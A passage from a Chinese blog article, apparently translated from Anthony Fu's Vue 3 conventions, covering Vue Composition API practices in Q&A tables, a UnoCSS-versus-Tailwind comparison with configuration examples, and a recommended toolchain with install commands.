<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>生命周期钩子必须同步注册吗？</td><td>是的。必须在 <code>setup</code> 或 <code>&lt;script setup&gt;</code> 的同步代码中调用，不能在 <code>setTimeout</code> 或 <code>async</code> 函数中。</td></tr><tr><td>onUpdated 钩子性能如何？</td><td>会在任何响应式数据变化导致的重新渲染后调用，可能频繁触发。谨慎使用，考虑用 <code>watch</code> 替代。</td></tr><tr><td>如何在组件外部注册生命周期？</td><td>使用 <code>effectScope</code> 创建作用域，在其中注册钩子。</td></tr></tbody></table>
<h4 data-id="heading-28">插槽</h4>

























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>插槽的作用域是什么？</td><td>默认插槽只能访问父组件的数据。作用域插槽通过 <code>v-slot="slotProps"</code> 接收子组件传递的数据。</td></tr><tr><td>defineSlots 的作用？</td><td>仅用于类型定义，帮助 TypeScript 推导插槽的 props 类型。不影响运行时。</td></tr><tr><td>插槽的 fallback content 是什么？</td><td><code>&lt;slot&gt;默认内容&lt;/slot&gt;</code> 中的默认内容，当父组件不提供插槽内容时显示。</td></tr><tr><td>动态插槽名如何使用？</td><td><code>v-slot:[dynamicSlotName]</code> 或 <code>#[dynamicSlotName]</code>。</td></tr></tbody></table>
<h4 data-id="heading-29">Provide / Inject</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>应该用什么作为 injection key？</td><td>使用 Symbol 而非字符串，避免命名冲突。<code>export const userKey = Symbol('user')</code>。</td></tr><tr><td>注入的数据可以修改吗？</td><td>可以，但建议 mutations 集中在 provider 组件，通过提供修改方法而非直接暴露响应式状态。</td></tr><tr><td>如何为 inject 提供类型？</td><td><code>const user = inject&lt;User&gt;(userKey)</code> 或在定义 key 时指定 <code>InjectionKey&lt;User&gt;</code>。</td></tr></tbody></table>
<h4 data-id="heading-30">组合式函数</h4>

























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>命名约定是什么？</td><td>以 <code>use</code> 开头，camelCase。例如 <code>useMouse</code>、<code>useFetch</code>。</td></tr><tr><td>返回值应该是什么？</td><td>返回包含响应式状态和方法的对象。使用 <code>readonly()</code> 保护内部状态。</td></tr><tr><td>何时使用 options 对象模式？</td><td>参数超过 2 个时推荐。<code>useFetch(url, { method, headers, onSuccess })</code>。</td></tr><tr><td>组合式函数可以嵌套调用吗？</td><td>可以。一个组合式函数可以调用其他组合式函数。</td></tr></tbody></table>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 示例：标准组合式函数</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useMouse</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> y = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">event: MouseEvent</span>) {
    x.<span class="hljs-property">value</span> = event.<span class="hljs-property">clientX</span>
    y.<span class="hljs-property">value</span> = event.<span class="hljs-property">clientY</span>
  }

  <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update))
  <span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, update))

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">x</span>: <span class="hljs-title function_">readonly</span>(x),
    <span class="hljs-attr">y</span>: <span class="hljs-title function_">readonly</span>(y),
  }
}
</code></pre>
<h4 data-id="heading-31">Composition API</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>为什么用 Composition API 替代 mixin？</td><td>Mixin 有命名冲突、来源不清晰、难以重用等问题。Composition API 通过函数组合解决这些问题。</td></tr><tr><td>Composition API 和 React Hooks 有什么区别？</td><td>Vue 的 setup 只执行一次，不受闭包陷阱影响。React Hooks 每次渲染都执行，需要依赖数组。</td></tr><tr><td>何时仍然使用 Options API？</td><td>简单组件、团队不熟悉 Composition API、维护老代码时可以使用 Options API。</td></tr></tbody></table>
<h4 data-id="heading-32">自定义指令</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>必须清理副作用吗？</td><td>是的。在 <code>unmounted</code> 钩子中清理事件监听器、定时器等，避免内存泄漏。</td></tr><tr><td>指令命名约定？</td><td>以 <code>v</code> 开头。注册时用 camelCase（<code>vFocus</code>），使用时用 kebab-case（<code>v-focus</code>）。</td></tr><tr><td>可以在组件上使用指令吗？</td><td>可以，但不推荐。指令会应用到组件的根元素，多根元素组件会报警告。</td></tr></tbody></table>
<h4 data-id="heading-33">过渡与动画</h4>

























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>Transition 只能包含单个子元素吗？</td><td>是的。多个元素需要用 <code>v-if</code> / <code>v-else</code> 或 <code>TransitionGroup</code>。</td></tr><tr><td>为什么列表项需要 key？</td><td><code>TransitionGroup</code> 使用 key 追踪元素移动，实现平滑的移动动画。</td></tr><tr><td>mode 属性的作用？</td><td><code>out-in</code>：旧元素先离开，新元素再进入。<code>in-out</code>：新元素先进入，旧元素再离开。</td></tr><tr><td>如何自定义动画时长？</td><td>通过 <code>duration</code> prop：<code>&lt;Transition :duration="500"&gt;</code> 或 <code>{ enter: 500, leave: 800 }</code>。</td></tr></tbody></table>
<h4 data-id="heading-34">KeepAlive</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>max 属性的作用？</td><td>限制缓存组件数量，超出时移除最久未访问的。<code>&lt;KeepAlive :max="10"&gt;</code>。</td></tr><tr><td>组件必须有 name 属性吗？</td><td>使用 <code>include</code> / <code>exclude</code> 时需要。<code>&lt;script setup&gt;</code> 组件名默认是文件名。</td></tr><tr><td>特殊生命周期钩子？</td><td><code>onActivated</code>（激活时）、<code>onDeactivated</code>（停用时）。用于处理缓存组件的状态恢复。</td></tr></tbody></table>
<h4 data-id="heading-35">异步组件</h4>

















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>delay 选项的作用？</td><td>延迟显示加载状态，避免加载很快时出现闪烁。默认 200ms。</td></tr><tr><td>hydration 策略是什么？</td><td>Vue 3.5+ 支持延迟 hydration：<code>defineAsyncComponent({ loader, hydrate: 'visible' })</code>。</td></tr></tbody></table>
<h4 data-id="heading-36">TypeScript 集成</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>如何为 defineProps 提供类型？</td><td>基于类型：<code>defineProps&lt;{ title: string }&gt;()</code>。基于运行时：<code>defineProps({ title: String })</code>。推荐前者。</td></tr><tr><td>withDefaults 如何使用？</td><td><code>withDefaults(defineProps&lt;Props&gt;(), { count: 0 })</code>，为类型定义的 props 提供默认值。</td></tr><tr><td>如何获取组件实例类型？</td><td><code>InstanceType&lt;typeof MyComponent&gt;</code>，用于 ref 的类型标注。</td></tr></tbody></table>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 完整示例</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MyComponent.vue'</span>

<span class="hljs-keyword">const</span> compRef = ref&lt;<span class="hljs-title class_">InstanceType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">MyComponent</span>&gt;&gt;()

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  compRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focus</span>() <span class="hljs-comment">// 类型安全的方法调用</span>
})
</code></pre>
<h4 data-id="heading-37">SSR 注意事项</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>如何避免跨请求状态污染？</td><td>每个请求创建新的应用实例。避免在模块顶层创建响应式状态。</td></tr><tr><td>服务端可以使用哪些 API？</td><td>不能用 <code>window</code>、<code>document</code> 等浏览器 API。生命周期只有 <code>setup</code>、<code>onServerPrefetch</code>。</td></tr><tr><td>getSSRProps 的作用？</td><td>在 SSR 时修改组件 props，常用于注入服务端数据。</td></tr></tbody></table>
<h4 data-id="heading-38">性能优化</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>props 稳定性为什么重要？</td><td>子组件使用 <code>shallowRef</code> 时，props 引用变化会触发重新渲染。尽量保持 props 引用稳定。</td></tr><tr><td>何时使用虚拟滚动？</td><td>渲染超过 1000 项的列表时。使用 <code>vue-virtual-scroller</code> 等库。</td></tr><tr><td>v-once 和 v-memo 的区别？</td><td><code>v-once</code>：只渲染一次，永不更新。<code>v-memo</code>：条件性跳过更新，依赖数组未变时复用。</td></tr></tbody></table>
<h4 data-id="heading-39">SFC 特性</h4>

















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>如何在 scoped 样式中修改子组件？</td><td>使用 <code>:deep()</code> 伪类：<code>.parent :deep(.child) { }</code>。</td></tr><tr><td>scoped CSS 的限制？</td><td>不影响子组件的根元素（会自动添加 scoped 属性）。深层元素需要 <code>:deep()</code>。</td></tr></tbody></table>
<h4 data-id="heading-40">插件开发</h4>





















<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>插件应该用 provide/inject 吗？</td><td>是的。插件通过 provide 提供功能，组件通过 inject 使用，比全局属性更灵活。</td></tr><tr><td>注入 key 命名约定？</td><td>使用 Symbol 避免冲突：<code>export const myPluginKey = Symbol()</code>。</td></tr><tr><td>如何为插件添加类型支持？</td><td>通过模块扩展：<code>declare module 'vue' { interface ComponentCustomProperties { $myPlugin: MyPlugin } }</code>。</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-41">第四部分：为什么选择 UnoCSS 而不是 Tailwind CSS？</h3>
<h4 data-id="heading-42">核心论点：UnoCSS 是 Tailwind 的超集</h4>
<p>UnoCSS 不是 Tailwind 的竞争者，而是增强版。通过预设系统，UnoCSS 可以 <strong>100% 兼容 Tailwind 语法</strong>：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// uno.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig, presetWind } <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">presets</span>: [
    <span class="hljs-title function_">presetWind</span>(), <span class="hljs-comment">// Tailwind CSS v3 兼容</span>
    <span class="hljs-comment">// 或 presetWind({ version: 4 }) // Tailwind CSS v4 兼容</span>
  ],
})
</code></pre>
<p>使用 <code>presetWind</code> 后，所有 Tailwind 类名都能正常工作：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- Tailwind 语法完全兼容 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center justify-between p-4 bg-blue-500 text-white rounded-lg shadow-md hover:bg-blue-600 transition"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl font-bold"</span>&gt;</span>完全兼容<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h4 data-id="heading-43">UnoCSS 的独家能力</h4>
<h5 data-id="heading-44">1. 纯 CSS 图标（零 JS 运行时）</h5>
<p>UnoCSS 通过 <code>presetIcons</code> 支持 <strong>10 万+ Iconify 图标</strong>，编译为纯 CSS，零 JavaScript 运行时开销：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D @iconify-json/carbon @iconify-json/mdi
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 直接用 class 引用图标，无需导入 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"i-carbon-logo-github text-2xl"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"i-mdi-home text-red-500"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"i-carbon-arrow-right hover:i-carbon-arrow-right-filled"</span> /&gt;</span>
</code></pre>
<p><strong>编译结果（纯 CSS）：</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.i-carbon-logo-github</span> {
  <span class="hljs-attribute">display</span>: inline-block;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"data:image/svg+xml;utf8,..."</span>) no-repeat;
  <span class="hljs-attribute">background-size</span>: <span class="hljs-number">100%</span> <span class="hljs-number">100%</span>;
}
</code></pre>
<p><strong>对比 Tailwind + React Icons：</strong></p>
<ul>
<li>Tailwind：需要导入 React/Vue 组件，增加 bundle 体积</li>
<li>UnoCSS：纯 CSS，零 JS，图标按需编译</li>
</ul>
<h5 data-id="heading-45">2. 属性化模式（Attributify）</h5>
<p>避免 class 字符串爆炸：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- Tailwind：class 字符串过长 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-300 flex items-center gap-2"</span>&gt;</span>
  提交
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-comment">&lt;!-- UnoCSS：属性化模式 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
  <span class="hljs-attr">bg</span>=<span class="hljs-string">"blue-500 hover:blue-600"</span>
  <span class="hljs-attr">text</span>=<span class="hljs-string">"white"</span>
  <span class="hljs-attr">font</span>=<span class="hljs-string">"bold"</span>
  <span class="hljs-attr">p</span>=<span class="hljs-string">"y-2 x-4"</span>
  <span class="hljs-attr">rounded</span>=<span class="hljs-string">"lg"</span>
  <span class="hljs-attr">shadow</span>=<span class="hljs-string">"md"</span>
  <span class="hljs-attr">transition</span>
  <span class="hljs-attr">duration</span>=<span class="hljs-string">"300"</span>
  <span class="hljs-attr">flex</span>
  <span class="hljs-attr">items</span>=<span class="hljs-string">"center"</span>
  <span class="hljs-attr">gap</span>=<span class="hljs-string">"2"</span>
&gt;</span>
  提交
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<h5 data-id="heading-46">3. Variant Group（变体组简写）</h5>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- Tailwind：重复写 hover --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hover:bg-red-500 hover:text-white hover:scale-105"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- UnoCSS：Variant Group --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hover:(bg-red-500 text-white scale-105)"</span>&gt;</span>
</code></pre>
<h5 data-id="heading-47">4. 自定义规则引擎</h5>
<p>Tailwind 需要配置复杂的插件系统，UnoCSS 支持正则和函数定义原子类：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// uno.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">rules</span>: [
    <span class="hljs-comment">// 正则匹配：自定义间距</span>
    [<span class="hljs-regexp">/^m-(\d+)$/</span>, <span class="hljs-function">(<span class="hljs-params">[, d]</span>) =&gt;</span> ({ <span class="hljs-attr">margin</span>: <span class="hljs-string">`<span class="hljs-subst">${d}</span>px`</span> })],
    
    <span class="hljs-comment">// 函数定义：自定义颜色</span>
    [<span class="hljs-string">'text-brand'</span>, { <span class="hljs-attr">color</span>: <span class="hljs-string">'#3b82f6'</span> }],
    
    <span class="hljs-comment">// 动态值：任意单位</span>
    [<span class="hljs-regexp">/^gap-(\d+)(px|rem|em)$/</span>, <span class="hljs-function">(<span class="hljs-params">[, num, unit]</span>) =&gt;</span> ({ <span class="hljs-attr">gap</span>: <span class="hljs-string">`<span class="hljs-subst">${num}</span><span class="hljs-subst">${unit}</span>`</span> })],
  ],
  <span class="hljs-attr">shortcuts</span>: {
    <span class="hljs-comment">// 快捷组合类</span>
    <span class="hljs-string">'btn-primary'</span>: <span class="hljs-string">'bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600'</span>,
  },
})
</code></pre>
<h5 data-id="heading-48">5. 编译模式（Compile Class）</h5>
<p>将多个原子类编译为一个哈希类，减少 HTML 体积：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 开发模式：原子类 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center gap-4 bg-blue-500 p-4"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 生产模式：编译为单个类 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"uno-abc123"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.uno-abc123</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">1rem</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3b82f6</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">1rem</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h4 data-id="heading-49">对比总结</h4>


















































<table><thead><tr><th>特性</th><th>Tailwind CSS</th><th>UnoCSS</th></tr></thead><tbody><tr><td>基础原子类</td><td>✅ 完整支持</td><td>✅ 完全兼容（presetWind）</td></tr><tr><td>图标方案</td><td>需要额外库（React Icons 等）</td><td>✅ 内置 10 万+ 图标（纯 CSS）</td></tr><tr><td>属性化模式</td><td>❌ 不支持</td><td>✅ presetAttributify</td></tr><tr><td>Variant Group</td><td>❌ 不支持</td><td>✅ <code>hover:(bg-red text-white)</code></td></tr><tr><td>自定义规则</td><td>复杂插件系统</td><td>✅ 正则/函数直接定义</td></tr><tr><td>编译模式</td><td>❌ 不支持</td><td>✅ 编译为哈希类</td></tr><tr><td>性能</td><td>JIT 编译快</td><td>✅ 更快（Vite 原生）</td></tr><tr><td>生态整合</td><td>Standalone</td><td>✅ Vite/Nuxt 深度集成</td></tr></tbody></table>
<h4 data-id="heading-50">与 Anthony Fu 技术栈的协同</h4>
<ol>
<li><strong>Vite 原生设计</strong>：UnoCSS 为 Vite 设计，HMR 极快</li>
<li><strong>Nuxt 一等公民</strong>：<code>@nuxt/unocss</code> 开箱即用</li>
<li><strong>作者生态</strong>：Anthony Fu 同时是 UnoCSS 和 Iconify 的作者，工具链深度整合</li>
</ol>
<h4 data-id="heading-51">完整配置示例</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// uno.config.ts</span>
<span class="hljs-keyword">import</span> {
  defineConfig,
  presetAttributify,
  presetIcons,
  presetTypography,
  presetUno,
  presetWebFonts,
  transformerDirectives,
  transformerVariantGroup,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 预设</span>
  <span class="hljs-attr">presets</span>: [
    <span class="hljs-title function_">presetUno</span>(), <span class="hljs-comment">// 默认预设（类似 Tailwind）</span>
    <span class="hljs-title function_">presetAttributify</span>(), <span class="hljs-comment">// 属性化模式</span>
    <span class="hljs-title function_">presetIcons</span>({
      <span class="hljs-attr">scale</span>: <span class="hljs-number">1.2</span>,
      <span class="hljs-attr">cdn</span>: <span class="hljs-string">'https://esm.sh/'</span>,
    }),
    <span class="hljs-title function_">presetTypography</span>(), <span class="hljs-comment">// 排版预设</span>
    <span class="hljs-title function_">presetWebFonts</span>({
      <span class="hljs-attr">fonts</span>: {
        <span class="hljs-attr">sans</span>: <span class="hljs-string">'Inter'</span>,
        <span class="hljs-attr">mono</span>: <span class="hljs-string">'Fira Code'</span>,
      },
    }),
  ],

  <span class="hljs-comment">// 转换器</span>
  <span class="hljs-attr">transformers</span>: [
    <span class="hljs-title function_">transformerDirectives</span>(), <span class="hljs-comment">// @apply 指令</span>
    <span class="hljs-title function_">transformerVariantGroup</span>(), <span class="hljs-comment">// Variant Group</span>
  ],

  <span class="hljs-comment">// 自定义规则</span>
  <span class="hljs-attr">rules</span>: [
    [<span class="hljs-string">'text-brand'</span>, { <span class="hljs-attr">color</span>: <span class="hljs-string">'#3b82f6'</span> }],
  ],

  <span class="hljs-comment">// 快捷方式</span>
  <span class="hljs-attr">shortcuts</span>: {
    <span class="hljs-string">'btn'</span>: <span class="hljs-string">'px-4 py-2 rounded inline-block cursor-pointer'</span>,
    <span class="hljs-string">'btn-primary'</span>: <span class="hljs-string">'btn bg-blue-500 text-white hover:bg-blue-600'</span>,
  },

  <span class="hljs-comment">// 主题扩展</span>
  <span class="hljs-attr">theme</span>: {
    <span class="hljs-attr">colors</span>: {
      <span class="hljs-attr">brand</span>: {
        <span class="hljs-attr">primary</span>: <span class="hljs-string">'#3b82f6'</span>,
        <span class="hljs-attr">secondary</span>: <span class="hljs-string">'#8b5cf6'</span>,
      },
    },
  },
})
</code></pre>
<p><strong>安装命令：</strong></p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unocss
pnpm add -D @iconify-json/carbon @iconify-json/mdi
</code></pre>
<hr/>
<h3 data-id="heading-52">第五部分：配套工具链一览</h3>






































































<table><thead><tr><th>工具</th><th>用途</th><th>推荐理由</th></tr></thead><tbody><tr><td><strong>Vue 3.5+</strong></td><td>渐进式 JavaScript 框架</td><td>Composition API、性能优化、TypeScript 支持</td></tr><tr><td><strong>Nuxt 3</strong></td><td>Vue 元框架</td><td>SSR/SSG、文件路由、服务端 API、SEO 优化</td></tr><tr><td><strong>Pinia</strong></td><td>状态管理</td><td>直观的 API、完整的 TypeScript 支持、Vue DevTools 集成</td></tr><tr><td><strong>Vite</strong></td><td>构建工具</td><td>极速 HMR、原生 ESM、Rollup 生产构建</td></tr><tr><td><strong>VitePress</strong></td><td>静态站点生成器</td><td>Vue 驱动、Markdown 扩展、主题定制</td></tr><tr><td><strong>Vitest</strong></td><td>单元测试</td><td>Vite 原生、与 Jest 兼容的 API、快速执行</td></tr><tr><td><strong>UnoCSS</strong></td><td>原子化 CSS 引擎</td><td>Tailwind 超集、纯 CSS 图标、Vite 深度集成</td></tr><tr><td><strong>pnpm</strong></td><td>包管理器</td><td>磁盘高效、严格依赖管理、monorepo 支持</td></tr><tr><td><strong>VueUse</strong></td><td>组合式函数集合</td><td>200+ 实用工具、SSR 友好、Tree-shakable</td></tr><tr><td><strong>Slidev</strong></td><td>开发者幻灯片</td><td>Markdown 编写、Vue 组件、录制功能</td></tr><tr><td><strong>tsdown</strong></td><td>TypeScript 打包工具</td><td>零配置、类型声明生成、ESM/CJS 双输出</td></tr><tr><td><strong>Vue Router</strong></td><td>官方路由</td><td>嵌套路由、导航守卫、动态路由匹配</td></tr></tbody></table>
<h4 data-id="heading-53">快速开始命令</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建 Vue 3 项目（Vite）</span>
pnpm create vite my-vue-app --template vue-ts

<span class="hljs-comment"># 创建 Nuxt 3 项目</span>
pnpm dlx nuxi@latest init my-nuxt-app

<span class="hljs-comment"># 添加 UnoCSS</span>
pnpm add -D unocss

<span class="hljs-comment"># 添加 VueUse</span>
pnpm add @vueuse/core

<span class="hljs-comment"># 添加 Pinia</span>
pnpm add pinia

<span class="hljs-comment"># 添加 Vitest</span>
pnpm add -D vitest
</code></pre>
<hr/>
<h3 data-id="heading-54">总结</h3>
<p>Anthony Fu 的开发规范强调：</p>
<ol>
<li><strong>类型安全优先</strong>：TypeScript + 显式类型定义</li>
<li><strong>性能意识</strong>：<code>shallowRef</code> &gt; <code>ref</code>、避免深度侦听、虚拟滚动</li>
<li><strong>工具链协同</strong>：Vite + UnoCSS + Vitest 深度整合</li>
<li><strong>代码质量</strong>：单一职责、ESLint 自动化、Git Hooks</li>
<li><strong>现代化实践</strong>：Composition API、<code>&lt;script setup&gt;</code>、组合式函数</li>
</ol>
<p>通过遵循这些规范，可以构建更快、更可维护、更具扩展性的 Vue 3 应用。</p>
<hr/>
<p><strong>参考资料：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fantfu%2Fskills" target="_blank" title="https://github.com/antfu/skills" ref="nofollow noopener noreferrer">antfu/skills</a> - Anthony Fu 的技能标准文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2F" target="_blank" title="https://vuejs.org/" ref="nofollow noopener noreferrer">Vue 3 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Funocss.dev%2F" target="_blank" title="https://unocss.dev/" ref="nofollow noopener noreferrer">UnoCSS 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvueuse.org%2F" target="_blank" title="https://vueuse.org/" ref="nofollow noopener noreferrer">VueUse 文档</a></li>
</ul>
<p><strong>译者注：</strong> 本文基于 antfu/skills 仓库于 2026 年 2 月的内容整理翻译，随着生态演进，部分实践可能更新，请以官方文档为准。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vben Admin管理系统集成微前端wujie-(三）终]]></title>    <link>https://juejin.cn/post/7605529884824485951</link>    <guid>https://juejin.cn/post/7605529884824485951</guid>    <pubDate>2026-02-12T14:56:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605529884824485951" data-draft-id="7605530057175908395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vben Admin管理系统集成微前端wujie-(三）终"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-02-12T14:56:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="go_caipu"/> <meta itemprop="url" content="https://juejin.cn/user/4353721778049864"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vben Admin管理系统集成微前端wujie-(三）终
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721778049864/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    go_caipu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T14:56:37.000Z" title="Thu Feb 12 2026 14:56:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
